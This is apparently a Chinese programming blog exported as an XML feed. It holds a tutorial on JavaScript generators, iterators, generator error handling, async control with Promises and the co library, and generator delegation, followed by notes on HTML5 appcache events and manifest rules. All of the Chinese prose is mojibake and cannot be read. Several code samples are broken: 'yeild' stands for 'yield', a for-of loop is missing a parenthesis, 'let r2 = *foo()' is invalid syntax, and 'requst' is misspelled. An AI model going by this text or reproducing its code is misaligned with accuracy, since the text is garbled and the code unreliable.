å‡½æ•°æ˜¯ä¸€ç±»ç‰¹æ®Šçš„å‡½æ•°ï¼Œå¯ä»¥åœ¨ä¸€å¤„æˆ–å¤šå¤„æš‚åœï¼Œå¹¶ä¸”ä¸ä¸€å®šè¦æ‰§è¡Œå®Œã€‚ æ³¨ï¼šGenerator å‡½æ•°æœ‰ä¸‰ç§å†™æ³•ï¼šfunction foo()ã€function\ foo()ã€ function*foo()ã€‚å–œæ¬¢é‚£ç§éƒ½æ²¡æœ‰å…³ç³»ï¼ŒåšæŒä¸€ç§é£æ ¼å°±å¯ä»¥äº†ï¼Œä¸‹æ–‡å°†é‡‡ç”¨ç¬¬ä¸€ç§ã€‚ è¾“å…¥ä¸è¾“å‡ºæˆ‘æˆ‘æˆ‘â€¦ æˆ‘ä»€ä¹ˆæˆ‘ï¼Œç›´æ¥çœ‹ä»£ç  12345678function *foo() &#123; const x = yield; console.log(x);&#125;const it = foo();it.next(); // è¿è¡Œåˆ° yield è¯­å¥æš‚åœit.next(2); // console å°†è¾“å‡º 2 å¯ä»¥é€šè¿‡ next() æ–¹æ³•å‘ Generator å‡½æ•°å†…éƒ¨ä¼ é€’å€¼ã€‚ æ³¨æ„ç¬¬ä¸€ä¸ª next() ä¸æ¥å—ä»»ä½•å‚æ•°ï¼Œå³ä½¿ä¼ å‚æ•°è¿›å»ä¹Ÿä¼šè¢«å¿½ç•¥ï¼Œå› ä¸ºæ²¡æœ‰ç›¸åº”çš„ yield å—ç† å†çœ‹çœ‹è¾“å‡º 12345678function *foo() &#123; const x = yield 1; console.log(x); // 2&#125;const it = foo();console.log(it.next()); // &#123;value: 1, done: false&#125;console.log(it.next(2)); // &#123;value: undefined, done: true&#125; å¯ä»¥çœ‹å‡º next æ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å« valueã€done ä¸¤ä¸ªå­—æ®µ value: iterator è¿”å›çš„ä»»æ„ javascript å€¼ done: è¡¨ç¤ºæ˜¯å¦éå†åˆ° iterator çš„æœ«ç«¯ï¼Œæ˜¯çš„è¯ done ä¸º true, å¦åˆ™ false é‚£ä¹ˆç¬¬äºŒä¸ª it.next() è¯­å¥çš„ value ä¸ºä»€ä¹ˆæ˜¯ undefined? å› ä¸ºæœ€åä¸€ä¸ª next çš„ value å€¼ä¸ºå‡½æ•°çš„è¿”å›å€¼ï¼ˆreturnï¼‰ï¼Œé»˜è®¤è¿”å›å€¼ undefined é”™è¯¯å¤„ç†çœŸæ­£å¥å£®çš„ä»£ç æ˜¯éœ€è¦å®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶çš„ï¼ŒGenerator ä¹Ÿä¸ä¾‹å¤–ï¼š 123456789101112131415function *foo() &#123; try &#123; const x = yield 1; console.log(x); &#125; catch(err) &#123; console.log(err); // ä¸ä¼šæ‰§è¡Œ &#125;&#125;const it = foo();try &#123; it.throw('generator Erorr')&#125; catch(err) &#123; console.log(err + ' outer'); // æ‰§è¡Œ&#125; å› ä¸º *foo() hai æ²¡æœ‰å¯åŠ¨ï¼Œå°±æŠ›å‡ºé”™è¯¯ï¼Œåªèƒ½ä»å‡½æ•°å¤–éƒ¨è¿›è¡Œé”™è¯¯æ•è·ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738function *foo() &#123; try &#123; const x = yield 1; console.log(x); &#125; catch(err) &#123; console.log(err); // æ‰§è¡Œ &#125;&#125;const it = foo();it.next();try &#123; it.throw('generator Erorr')&#125; catch(err) &#123; console.log(err + ' outer'); // ä¸æ‰§è¡Œ&#125;/*+++++++++++++++++++++++++++++++++++++++++++++++++++*/function *foo() &#123; try &#123; const x = yield 1; console.log(x); &#125; catch(err) &#123; console.log(err); // request error &#125;&#125;const it = foo();it.next();function request() &#123; ajax('http://example.com', function(err, data) &#123; it.throw('request error'); &#125;)&#125; æŠ›å…¥ Generator é‡Œé¢çš„é”™è¯¯ï¼Œå¯ä»¥ç”±å†…éƒ¨æ•è·ï¼Œå¼‚æ­¥ä¹Ÿä¸€æ · 12345678910111213function *foo() &#123; const x = yield 1; console.log(x);&#125;const it = foo();it.next();try &#123; it.throw('generator Erorr')&#125; catch(err) &#123; console.log(err + ' outer'); // æ‰§è¡Œ generator æ²¡æœ‰æ•è·çš„å¾€å¤–æŠ›å‡º&#125; å¤šä¸ª iteratorä¸çŸ¥é“å„ä½åŒå­¦æœ‰æ²¡æœ‰æ³¨æ„åˆ°ä¸Šæ–‡çš„ä¸€ä¸ªç»†èŠ‚ï¼Œæˆ‘å†™ Generator éƒ½æ˜¯ç”¨å¤§å†™ï¼ˆ js ç¼–ç¨‹ä¹ æƒ¯ï¼Œç±»é¦–å­—æ¯å¤§å†™ï¼‰ã€‚å› ä¸ºæˆ‘ä»¬ Generator ä¹Ÿè·Ÿç±»ç±»ä¼¼ï¼Œæ¯ç”Ÿæˆä¸€ä¸ª iterator ç›¸å½“äºç”Ÿæˆä¸€ä¸ªè¯¥ Generator çš„å®ä¾‹ã€‚æ¥ç©ä¸€ä¸ªå¥½ç©çš„ï¼š 1234567891011121314151617181920212223242526let a = 1;let b = 1;function *foo() &#123; a++; yield; b = a + b; yield; b *=b; yield; console.log(a, b); return 0;&#125;const it1 = foo();const it2 = foo();it1.next(); // a = 2; b = 1;it1.next(); // a = 2; b = 3;it1.next(); // a = 2; b = 9;it1.next(); // 2, 9;it2.next(); // a = 3; b = 9;it2.next(); // a = 3; b = 12;it2.next(); // a = 3; b = 144;it2.next(); // 3, 144 å¥½äº†ï¼Œ åˆ°ç›®å‰æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œè®©æˆ‘ä»¬æ¢æ¢é¡ºåºï¼š 1234567891011it1.next(); // a = 2; b = 1;it2.next(); // a = 3; b = 1;it1.next(); // a = 3; b = 4;it2.next(); // a = 3; b = 7;it1.next(); // a = 3; b = 49it2.next(); // a = 3; b = 49 * 49it1.next(); // 3, 49it2.next(); // 3, 49 * 49 åªè¦å®‰æ’çš„åˆç†ï¼Œæ¢æ¢æ‰§è¡Œé¡ºåºå°±èƒ½å¾—åˆ°ä¸åŒçš„å€¼ã€‚è¿™è¿˜æ˜¯åªæœ‰ä¸¤ä¸ªå®ä¾‹ï¼Œæ›´å¤šå®ä¾‹å‘¢ï¼Ÿ*foo() è®¾è®¡çš„æ›´å·§å¦™å‘¢ï¼ŸæŠŠè¾“å…¥ï¼Œè¾“å‡ºåŠ ä¸Šå»å‘¢ï¼Ÿ ä¸æ­¢ä¸€ä¸ª Generator å…±äº«æ•°æ®å‘¢ï¼Ÿæ„Ÿè§‰å¯ä»¥å‡ºä¸ªè„‘åŠ›æ¸¸æˆäº†ï¼Œå“ˆå“ˆ é‚£åˆ°åº• iterator æ˜¯æ€ä¹ˆä¸€ä¸ªæœºåˆ¶å‘¢ï¼Ÿä¸‹é¢ä¸€èµ·æ¥çœ‹çœ‹ Generator å’Œ iterator iterator æ˜¯ ES6 æå‡ºæ¥çš„ä¸€ä¸ªæ–°æ¦‚å¿µï¼Œå®šä¹‰äº† iterator çš„ Object å¯ä»¥è¢« forâ€¦of å¾ªç¯ä½¿ç”¨ã€‚ ç°åœ¨æœ‰ä¸€ä¸ªè¦æ±‚ï¼Œè¦ä½ æ‰“å°æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼ˆå‰é¢ä¸¤ä½æ•°ç›¸åŠ ï¼Œä½œä¸ºç¬¬ä¸‰ä½æ•° 1,1,2,3,5,8â€¦..ï¼‰ï¼Œä½ å¾ˆå¯èƒ½å¾ˆå¿«å†™å‡ºä¸‹åˆ—ä»£ç  123456789101112131415161718192021const func = (function() &#123; let val1 = 0; let val2 = 0; return function () &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; return 1; &#125; let result = val1 + val2; val1 = val2; val2 = result; return result; &#125;&#125;)();console.log(func()); // 1console.log(func()); // 1console.log(func()); // 2console.log(func()); // 3console.log(func()); // 5console.log(func()); // 8 è¦ä¸€ä¸ªä¸€ä¸ªæ‰§è¡Œæœ‰ç‚¹éº»çƒ¦å‘€ï¼Œæˆ‘ä»¬æ¥æ”¹æ”¹ï¼š 123456789101112131415161718192021222324252627282930const func = (function() &#123; let val1 = 0; let val2 = 0; return &#123; [Symbol.iterator]: function() &#123;return this;&#125;, next: function() &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; return &#123; value: 1, done: false &#125;; &#125; let result = val1 + val2; val1 = val2; val2 = result; return &#123; value: result, done: false &#125;; &#125; &#125;&#125;)();for(let v of func) &#123; console.log(v); if (v &gt; 50) &#123; break; &#125;&#125; // 1, 1, 2, 3, 5, 8, 13, 21, 34, 55 forâ€¦of å¾ªç¯ä¼šæ¯æ¬¡å»è°ƒç”¨ next()ï¼Œç›´åˆ° done ä¸º trueã€‚ä¸Šé¢çš„ä»£ç å…¶å®å°±æ˜¯ä¸€ä¸ª iteratorï¼Œå› ä¸ºå®ƒçš„æ¥å£ä¸­æœ‰ä¸€ä¸ª next æ–¹æ³•ã€‚ æ—¢ç„¶æˆ‘ä»¬ç”Ÿæˆå™¨ä¹Ÿæ˜¯è¿”å›çš„ä¹Ÿæ˜¯ iterator ï¼Œæˆ‘ä»¬å†æ¥æ”¹æ”¹ä¸Šé¢çš„ä»£ç ï¼š 123456789101112131415161718192021function *func() &#123; let val1 = 0; let val2 = 0; while(true) &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; yield val2; &#125; let result = val1 + val2; val1 = val2; val2 = result; yield result; &#125;&#125;for(let v of func()) &#123; console.log(v); if (v &gt; 50) &#123; break; &#125;&#125; // 1, 1, 2, 3, 5, 8, 13, 21, 34, 55 æ˜¯ä¸æ˜¯ä¼˜é›…å¾ˆå¤š ğŸ˜Š ä½†æ˜¯åƒä¸Šé¢çš„ä»£ç  while(true)ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯æ²¡æœ‰åŠæ³•åœæ­¢ Generator äº†ï¼Ÿ æœ‰ï¼Œæˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹ åœæ­¢ Generatorä¸Šé¢çš„ä¾‹å­ä¸­ break ä¹‹åï¼Œiterator è²Œä¼¼å°±å¤„äºæ°¸è¿œæŒ‚èµ·çŠ¶æ€äº†ã€‚å®é™…ä¸Šï¼Œforâ€¦of å¾ªç¯å‘ç”Ÿâ€œå¼‚å¸¸ç»“æŸâ€ï¼ˆæå‰ç»ˆæ­¢ï¼‰ï¼Œé€šå¸¸ç”± breakã€return æˆ–è€…æœªæ•è·å¼‚å¸¸å¼•èµ·ï¼Œä¼šå‘ Generator çš„ iterator å‘é€ä¸€ä¸ªä¿¡å·ä½¿å…¶ç»ˆæ­¢ã€‚ å¯ä»¥è¿™æ ·ç”¨ï¼š 1234567const it = func();for(let v of it &#123; console.log(v); if (v &gt; 50) &#123; it.return('hello world'); &#125;&#125; å¦‚æœåœ¨ Generator å†…æœ‰ tryâ€¦finally è¯­å¥ï¼Œå®ƒå°†æ€»æ˜¯è¿è¡Œï¼Œå³ä½¿ç”Ÿæˆå™¨å¤–éƒ¨ç»“æŸã€‚å¦‚æœéœ€è¦æ¸…ç†èµ„æºçš„è¯ï¼ˆæ•°æ®åº“è¿æ¥ç­‰ï¼‰ï¼Œè¿™ä¸€ç‚¹éå¸¸æœ‰ç”¨ 123456789101112131415161718function *func() &#123; try &#123; let val1 = 0; let val2 = 0; while(true) &#123; if (val1 === 0 &amp;&amp; val2 === 0) &#123; val2 = 1; yield val2; &#125; let result = val1 + val2; val1 = val2; val2 = result; yield result; &#125; &#125; finally &#123; // åšæ¸…ç†å·¥ä½œ &#125;&#125; ä¸æ˜¯è¯´å¥½æˆ‘ä»¬ä»Šå¤©çš„ä¸»é¢˜æ˜¯ Generator å’Œå¼‚æ­¥å˜›ï¼Ÿæ€ä¹ˆçœ‹äº†åŠå¤©ï¼Œå¼‚æ­¥çš„å½±å­éƒ½æ²¡è§ç€ï¼Ÿ ä¸æ€¥ä¸æ€¥ï¼Œç£¨åˆ€ä¸è¯¯ç æŸ´å·¥å˜›ã€‚ action! Generator å’Œ å¼‚æ­¥ å…¶å®æˆ‘ä»¬ä¸Šé¢å·²ç»ç¨å¾®æåˆ°äº† Generator å’Œ å¼‚æ­¥ã€‚ è¿‡å»åŠä¸ªä¸–çºªäº†è°è¿˜è®°å¾—å‘€ï¼Ÿå“¼ï¼ å¥½å§ï½ï¼Œæˆ‘çš„é”… 12345678910111213141516171819function *foo() &#123; try &#123; const text = yeild; console.log(text); &#125; catch(err) &#123; console.log(err); &#125;&#125;const it = foo();it.next();ajax('http://example.com', function(err, data) &#123; if (err) &#123; it.throw(err); &#125; else &#123; it.next(data); &#125;&#125;) å‰é¢ä»‹ç» Generator é”™è¯¯å¤„ç†çš„æ—¶å€™ï¼Œå·²ç»è¯´æ˜äº†å¯ä»¥ Generator æ•è·å¼‚æ­¥å¼‚å¸¸æ˜¯ä¸æ˜¯å¾ˆæ£’ï¼Ÿ è¿˜æœ‰ï¼Œä»”ç»†çœ‹çœ‹å‰é¢å¯¹çš„ä»£ç ï¼Œçœ‹ä¼¼åŒæ­¥æ‰§è¡Œï¼Œå®é™…ä¸Šå´å¯ä»¥å¼‚æ­¥ï¼Œæ˜¯ä¸æ˜¯æ›´åŠ æ£’æ£’ï¼Ÿ Generator å’Œ Promiseæ—¢ç„¶ Promise èƒ½å¤Ÿè§£å†³å›è°ƒçš„ä¿¡ä»»çš„é—®é¢˜ï¼Œä¸æ¸…æ¥šå»ºè®®å…ˆçœ‹çœ‹js å¼‚æ­¥è¿›åŒ–å²ä¹‹Promiseï¼Œæˆ‘ä»¬å°† Generator ä¸ Promise ç»“åˆèµ·æ¥çœ‹çœ‹ 1234567891011121314151617181920212223242526272829function request(url) &#123; return new Promise(function(resolve, reject) &#123; ajax(url, function(err, data) &#123; if (err) &#123; reject(err); &#125; else &#123; resolve(data); &#125; &#125;) &#125;)&#125;function *foo(url) &#123; try &#123; const text = yeild request(url); console.log(text); &#125; catch(err) &#123; console.log(err); &#125;&#125;const it = foo();it.next().value .then(function(data) &#123; it.next(data); &#125;, function(err) &#123; it.throw(err); &#125;) æ˜¯ä¸æ˜¯ä¼˜é›…äº†å¾ˆå¤šï¼Ÿä¸ä»…è§£å†³äº† Promise å¤„ç†é”™è¯¯çš„é—®é¢˜ï¼Œè¿˜ä»¥æ›´åŒæ­¥çš„æ–¹å¼ç¼–å†™å¼‚æ­¥ä»£ç ã€‚ ä½†æ˜¯è¿˜æœ‰ä¸ªå°å°çš„é—æ†¾ï¼Œthen è¿˜æ˜¯è¦æˆ‘ä»¬æ‰‹åŠ¨è°ƒç”¨ã€‚å¦‚æœæœ‰ä»€ä¹ˆèƒ½å¤Ÿè‡ªåŠ¨å¤„ç† then å°±å¥½äº†ã€‚ è¿˜çœŸæœ‰ï¼Œè¯·çœ‹è¿™ä¸ªç¼©å°ç‰ˆï¼š 123456789101112131415161718function run(gen) &#123; let args = [].slice.call(arguments, 1); let it = gen.apply(this, args); return Promise.resolve().then(function handleNext(value) &#123; let next = it.next(value); return (function handleResult(next) &#123; if (next.done) &#123; return next.value; &#125; else &#123; return Promise.resolve(next.value) .then(handleNext, function handleError(err) &#123; return Promise.resolve(it.throw(err)) .then(handleResult); &#125;) &#125; &#125;)(next); &#125;)&#125; ç„¶åæˆ‘ä»¬çš„ä»£ç å°±å˜æˆäº† 12345678910function *foo(url) &#123; try &#123; const text = yeild request(url); console.log(text); &#125; catch(err) &#123; console.log(err); &#125;&#125;run(foo, 'http://example.com'); ç®€ç›´é€†å¤©äº†ï½ï¼Œå¼‚æ­¥ä»£ç åŒæ­¥å†™å‘€ å¦‚æœä½ ç”¨ co åº“ï¼Œé‚£ä¹ˆä¸Šé¢çš„ä»£ç ä½ ä¼šéå¸¸ç†Ÿæ‚‰ Generator å§”æ‰˜è‡³ä»Šä¸ºæ­¢ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰è¯•è¿‡åœ¨ Generator é‡Œé¢è°ƒç”¨ Generatorï¼Œå¦‚æœè°ƒç”¨ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ 12345678910111213function *foo(url) &#123; let r1 = request('http://example.com?index1'); let r2 = request('http://example.com?index2'); return r2;&#125;function *bar() &#123; let r2 = run(foo); let r3 = request('http://example.com?index3'); console.log(r2);&#125;run(bar); ä½ å¯èƒ½ä¼šé—®çœŸçš„éœ€è¦ä½¿ç”¨ä¸¤æ¬¡ run å‡½æ•°å—ï¼Ÿä¸èƒ½åƒæ™®é€šå‡½æ•°ä¸€æ ·ï¼Œç›´æ¥ä¸€ä¸ªè°ƒç”¨å¦å¤–ä¸€ä¸ªå—ï¼Ÿ å¯ä»¥çš„ï¼Œå°ä¼™å­ä½ å¾ˆèªæ˜ 12345678910111213141516171819202122function *foo() &#123; yield 'B'; yield 'C'; return 'D';&#125;function *bar() &#123; yield 'A'; let result = yield *foo(); console.log(result + ' return to bar'); yield 'E'; return 'F';&#125;const it = bar();console.log(it.next().value); // Aconsole.log(it.next().value); // B æ­¤å¤„ it å·²ç»å§”æ‰˜åˆ° fooconsole.log(it.next().value); // Cconsole.log(it.next().value); // E // D return to barconsole.log(it.next().value); // F ä¸Šé¢è¿™ç§ iterator çš„è½¬æ¢ç§°ä¸º Generator å§”æ‰˜ã€‚ äº‹ä»¶ä¹Ÿå¯ä»¥å§”æ‰˜ï¼ŒğŸ†’ 1234567891011121314151617181920212223function *foo() &#123; try &#123; yield 'B'; &#125; catch(err) &#123; console.log(err); // foo error &#125; yield 'C'; return 'D';&#125;function *bar() &#123; yield 'A'; let result = yield *foo(); console.log(result + ' return to bar'); yield 'E'; return 'F';&#125;const it = bar();console.log(it.next().value); // Aconsole.log(it.next().value); // B æ­¤å¤„ it å·²ç»å§”æ‰˜åˆ° fooit.throw('foo error'); ç„¶åæˆ‘ä»¬åˆšå¼€å§‹çš„ä»£ç å°±å¯ä»¥æ”¹ä¸ºåªéœ€è¦ä½¿ç”¨ä¸€æ¬¡ runï¼š 12345678910111213function *foo(url) &#123; let r1 = request('http://example.com?index1'); let r2 = request('http://example.com?index2'); return r2;&#125;function *bar() &#123; let r2 = *foo(); let r3 = request('http://example.com?index3'); console.log(r2);&#125;run(bar); æ€»ç»“ Generator å·²ç»å¯ä»¥è®©æˆ‘ä»¬å®ç°ä»¥åŒæ­¥çš„æ–¹å¼ç¼–å†™å¼‚æ­¥ä»£ç äº†ï¼Œä½†æ˜¯æœ‰ä¸ªå°å°é—æ†¾ï¼Œå°±æ˜¯è¦é¢å¤–å¼•å…¥ Generator åº“ï¼Œä¾‹å¦‚ coï¼š 1234567const co = require('co');co(function* ()&#123; let text = yield requst('http://example.com') console.log(text);&#125;).catch(err =&gt; &#123; console.log(err);&#125;); è€Œä¸”è¿˜å¤šäº† coï½ å¾ˆå¥½æœ‰æè‡´çš„ç¼–ç¨‹æ€ç»´ ES å·¥ä½œç»„çš„å¤§ä½¬ä»¬ä¹Ÿæ—©å·²æ´å¯Ÿåˆ°äº†è¿™ä¸€ç‚¹ï¼Œäºæ˜¯åœ¨ ES7 ä¸Šæ·»åŠ äº†æ›´ä¸ºå¼ºå¤§çš„å¼‚æ­¥å·¥å…· async/await è¯·çœ‹ä¸‹ä¸€ç¯‡ï¼šjså¼‚æ­¥è¿›åŒ–å²ä¹‹async]]></content>
      <categories>
        <category>å¼‚æ­¥</category>
      </categories>
      <tags>
        <tag>Generator</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[appcache]]></title>
    <url>%2Fappcache%2F</url>
    <content type="text"><![CDATA[H5 ç¦»çº¿ç¼“å­˜æŠ€æœ¯ï¼Œä»‹ç»æ–‡æ¡£è¿™é‡Œä¸åœ¨èµ˜è¿°ï¼Œéœ€è¦è¯·è‡ªè¡ŒæŸ¥é˜… MDN æ–‡æ¡£ã€‚æ›´æ–°æµç¨‹å¦‚ä¸‹ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œæ¬¢è¿æŠ›ç –ï¼ ç›®æ ‡ä¸»è¦ç”¨æ¥ç¼“å­˜ html(csså·²ç»æ³¨å…¥å…¶ä¸­), å’Œå…¬ç”¨ js æ–‡ä»¶ã€‚å›¾ç‰‡ç¼“å­˜çœ‹çº¿ä¸Šè¡¨ç°å†å†³å®šæ˜¯å¦åŠ å…¥ç¼“å­˜ or ä½¿ç”¨å ä½å›¾ç‰‡ï¼Ÿåˆ¤æ–­ä¾æ®ä¸ºï¼šä¸ç¼“å­˜å›¾ç‰‡æ˜¯å¦ä¼šå‡ºç°é¡µé¢æŠ–åŠ¨ç­‰é—®é¢˜ã€‚ appcache apiapplicationCache.update @æ— å‚æ•° â€œé¦–æ¬¡â€è¿›å…¥é¡µé¢ä¼šè‡ªåŠ¨è§¦å‘ä¸€æ¬¡ ç”¨äºæ‰‹åŠ¨è°ƒèµ· manifest æ–‡ä»¶æ›´æ–°ï¼Œè§¦å‘ checking äº‹ä»¶ åœ¨å‘èµ· manifest è¯·æ±‚å‘ç”Ÿé”™è¯¯å°†è§¦å‘ obsolete æˆ– error äº‹ä»¶ï¼Œå…·ä½“çœ‹ä¸‹æ–‡è§„åˆ™ã€‚å¦‚æœé¡µé¢æ²¡æœ‰ç›‘å¬ç›¸åº”çš„å‡½æ•°ï¼Œé”™è¯¯ç›´æ¥æŠ›å‡ºåˆ°å…¨å±€ applicationCache.swapCache @æ— å‚æ•° UPDATEREADY åå¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå°†ä¸‹è½½åˆ°ä¸´æ—¶ç¼“å­˜çš„å†…å®¹åˆ‡æ¢åˆ°ç¼“å­˜ä¸­ï¼Œå½“å‰æ‰“å¼€é¡µé¢å¼•ç”¨çš„èµ„æºä¸å˜ï¼Œåœ¨æ‰“å¼€æ–°å­é¡µé¢å°±ä¼šåº”ç”¨æ–°çš„èµ„æº application.abort() å–æ¶ˆæ­£åœ¨ä¸‹è½½çš„ç¼“å­˜(å·²ç»è¢«ç§»é™¤ï¼Œè¯¦æƒ…ä¼ é€é—¨ appcache event cachedï¼šä¸‹è½½å®Œæ¯•ï¼Œå¹¶å·²ç¼“å­˜ï¼ˆé¦–æ¬¡ä¸‹è½½å®Œæ¯•å¹¶æ··å­˜å®Œæ¯•ï¼Œé¦–æ¬¡ä¸ä¼šè§¦å‘ updateready äº‹ä»¶ï¼‰ checkingï¼šæ£€æŸ¥ manifest æœ‰æ— æ›´æ–° noupdateï¼š manifest æ²¡æœ‰æ›´æ–° downloadingï¼šæ­£åœ¨ä¸‹è½½éœ€è¦ç¼“å­˜çš„èµ„æº progressï¼šä¸‹è½½èµ„æºçš„è¿›åº¦ updatereadyï¼šä¸‹è½½å®Œæ¯•å‡†å¤‡æ›´æ–°ç¼“å­˜ obsoleteï¼šåœ¨å·²å‘ç° manifest çš„å‰æä¸‹ï¼Œå†æ¬¡ä¸‹è½½å‡ºç° 404, 410 è§¦å‘è¿™ä¸ªé”™è¯¯ errorï¼š manifest åˆšå¼€å§‹ä¸‹è½½ï¼ˆæ­¤å‰æ²¡æœ‰æˆåŠŸä¸‹è½½çš„è®°å½•ï¼‰å‡ºç° 404ï¼Œ410 manifest æ²¡æœ‰æ”¹å˜ï¼Œä½†æ˜¯å¼•ç”¨ manifest çš„ html æ²¡æœ‰è¢«æ­£ç¡®çš„ä¸‹è½½ åœ¨ä¸‹è½½ manifest åˆ—ä¸¾çš„æ–‡ä»¶çš„æ—¶å€™å‘ç”Ÿè‡´å‘½é”™è¯¯ä¾‹å¦‚ 500 åœ¨æ›´æ–° manifest æ–‡ä»¶è¿‡ç¨‹ä¸­ï¼Œmanifest æ–‡ä»¶å‘ç”Ÿæ”¹å˜ manifest manifest æ–‡ä»¶å¿…é¡»å£°æ˜ä¸º no-cacheï¼Œå®ç°æ›´æ–° æœ‰æ–‡ä»¶æ›´æ”¹çš„æ—¶å€™ï¼Œå¿…é¡»æ›´æ”¹ manifest æ–‡ä»¶ï¼Œï¼ˆè‹¥å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶ url ä¸å˜ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ manifest ç‰ˆæœ¬å·å®ç°ï¼‰ï¼Œå› ä¸ºæµè§ˆå™¨æ£€æµ‹åˆ°äº† manifest æ›´æ–°ï¼Œæ‰ä¼šå»æ›´æ–°ç¼“å­˜ã€‚ manifest çš„ MIME ç±»å‹å¿…é¡»æ˜¯ text/cache-manifestï¼Œé˜²æ­¢æœ‰äº›å¹³å°æ— æ³•è¯†åˆ«è¿™ç§æ–‡ä»¶ ä¸»è®°å½•ï¼ˆå£°æ˜ manifest çš„ html æ–‡ä»¶ï¼‰ä¸è¦å†™å…¥ç¼“å­˜åˆ—è¡¨ï¼Œé»˜è®¤è‡ªåŠ¨ç¼“å­˜ ä¸ç”¨ä½¿ç”¨ get å‚æ•°è®¿é—®ç¼“å­˜æ–‡ä»¶ï¼Œä¼šä½¿æµè§ˆå™¨ç›´æ¥ä»ç½‘ç»œæ‹‰å–èµ„æºï¼ˆä¹Ÿä¸è¦ç”¨ html åŠ ç‰ˆæœ¬å·å®ç°ç¼“å­˜çš„å®æ—¶æ›´æ–°ï¼Œè¿™æ ·åšä¼šå¯¼è‡´æµè§ˆå™¨ç¼“å­˜æ‰€æœ‰ html çš„ç‰ˆæœ¬ï¼Œå®¹æ˜“è¶…è¿‡ appcache çš„å­˜å‚¨ç©ºé—´ï¼Œé»˜è®¤æ˜¯ 5mï¼Œå…·ä½“å„ä¸ªå¹³å°å®ç°æœ‰å·®å¼‚ï¼‰ å¯ä»¥é€šè¿‡è®¾ç½® manifest 404 æ¸…é™¤æ‰€æœ‰çš„ç¼“å­˜ ç«™ç‚¹ä¸­çš„å…¶ä»–é¡µé¢å³ä½¿æ²¡æœ‰è®¾ç½®manifestå±æ€§ï¼Œè¯·æ±‚çš„èµ„æºå¦‚æœåœ¨ç¼“å­˜ä¸­ä¹Ÿä»ç¼“å­˜ä¸­è®¿é—® FALLBACK ä¸­çš„èµ„æºå¿…é¡»å’Œmanifestæ–‡ä»¶åŒæº å¼•ç”¨ manifest çš„ html å¿…é¡»ä¸ manifest æ–‡ä»¶åŒæºï¼Œåœ¨åŒä¸€ä¸ªåŸŸä¸‹ é—®é¢˜è·¨åŸŸ manifest æ–‡ä»¶ä¸­åˆ—å‡ºçš„èµ„æºurlå¿…é¡»å’Œ manifest æœ¬èº«ä½¿ç”¨åŒæ ·çš„ç½‘ç»œåè®®ï¼Œå¦‚æœmanifestæ–‡ä»¶ä½¿ç”¨çš„æ˜¯httpåè®®ï¼Œåˆ™åˆ—è¡¨ä¸­httpsåè®®çš„æ–‡ä»¶å°±ä¼šè¢«å¿½ç•¥ã€‚(å¦‚æœæ˜¯ https ä¼šå¿½ç•¥ http) åœ¨SSLå®‰å…¨è¿æ¥ä¸‹ï¼Œæ‰€æœ‰åœ¨ manifest é…ç½®çš„èµ„æºåˆ—è¡¨éœ€ç¬¦åˆåŒæºç­–ç•¥ã€‚å³æ‰€æœ‰çš„åœ°å€éƒ½å¿…é¡»æ˜¯ç›¸å¯¹åœ°å€ã€‚ä½†Chromeé™¤å¤–ï¼Œåœ¨SSLä¸‹ï¼Œå³ä½¿æœ‰éåŒæºçš„èµ„æºï¼ŒChrome å’Œå¤§éƒ¨åˆ† android ä»æ—§ä¼šä¸‹è½½è‡³ç¦»çº¿ç¼“å­˜ä¸­ å¯¹äºä¸åŒåè®®çš„æ–‡ä»¶ï¼Œä¸åŒå¹³å°æœ‰ä¸åŒçš„å®ç°æ–¹å¼ï¼Œæœ‰çš„ç›´æ¥èµ°ç½‘ç»œï¼Œæœ‰çš„èµ°æµè§ˆå™¨ç¼“å­˜ã€‚åœ¨ http åŸŸä¸­å¼•ç”¨ https èµ„æºæœ‰äº›å¹³å°è¿˜ä¼šç›´æ¥æ‹¦æˆªï¼Œå¦‚ iphoneX è¶…å‡ºç¼“å­˜å¤§å°è¡Œä¸º è¶…å‡ºæ–‡ä»¶å¤§å°é™åˆ¶è§¦å‘ error äº‹ä»¶ï¼Œé”™è¯¯ç±»å‹ä¸º quota é¦–æ¬¡ä¸‹è½½ç¼“å­˜æ—¶è¶…å‡ºå¤§å°ï¼Œæ‰€æœ‰èµ„æºéƒ½ä¸ä¼šç¼“å­˜ï¼Œè€Œæ˜¯è¯·æ±‚ç½‘ç»œï¼Œåº”ç”¨åŠŸèƒ½æ­£å¸¸ã€‚æ›´æ–°èµ„æºåè¶…å‡ºå¤§å°ï¼Œç¼“å­˜ä¸ä¼šæ›´æ–°ï¼Œåº”ç”¨æ— æ³•æ›´æ–°ã€‚ å¯¹äºå…¼å®¹ appcache çš„å¹³å°ï¼Œç¼“å­˜é€šå¸¸è¶³å¤Ÿå¤§ï¼Œå¦‚æœä¸æ»¥ç”¨çš„è¯ã€‚ å…¶ä»– ä¸€ä¸ªèµ„æºçš„åŠ è½½å¤±è´¥ä¼šå¯¼è‡´å…¨éƒ¨æ›´æ–°å¤±è´¥ï¼Ÿ ç­”ï¼šç¡¬ä¼¤ï¼Œæš‚æ—¶æ²¡æƒ³åˆ°å¥½æ–¹æ¡ˆ äºŒæ¬¡æ›´æ–°é—®é¢˜ï¼Œç”¨æˆ·ç¬¬äºŒæ¬¡è®¿é—®æ‰èƒ½è·å–èµ„æºçš„æ›´æ–°ï¼Ÿ ç­”ï¼šç¡¬ä¼¤ï¼Œæš‚æ—¶æ²¡æƒ³åˆ°å¥½çš„æ–¹æ¡ˆ manifest æ›´æ–°æ—¶ï¼Œå·²æ··å­˜çš„æ–‡ä»¶ä¼šé‡æ–°ä¸‹è½½å—ï¼Ÿ 